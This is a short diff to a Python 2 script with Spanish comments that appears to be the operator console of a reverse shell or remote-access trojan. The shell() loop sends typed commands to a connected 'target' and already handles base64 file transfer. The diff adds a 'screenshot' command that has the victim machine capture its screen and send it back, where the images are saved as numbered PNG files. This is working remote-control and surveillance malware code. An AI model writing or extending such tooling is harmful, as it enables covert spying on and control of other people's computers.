@@ -6,6 +6,7 @@ import base64
 
 def shell():
 	current_dir = target.recv(1024)
+	count = 0
 	while True:
     	# Cambia el simbolo de la shell
 		comando = raw_input("{}~#: ".format(current_dir))
@@ -35,6 +36,17 @@ def shell():
 					target.send(base64.b64encode(file_upload.read()))
 			except:
 				print("Ocurrio un problema en la subida")
+		elif comando[:10] == "screenshot":
+			target.send(comando)
+			with open("monitor-%d.png" % count, 'wb') as screen:
+				datos =  target.recv(1000000)
+				data_decode = base64.b64decode(datos)
+				if data_decode == "fail":
+					print("No se pudo tomar la captura")
+				else:
+					screen.write(data_decode)
+					print("Captura correcta")
+					count = count+1
 		else:
 			target.send(comando)
 			res = target.recv(30000)
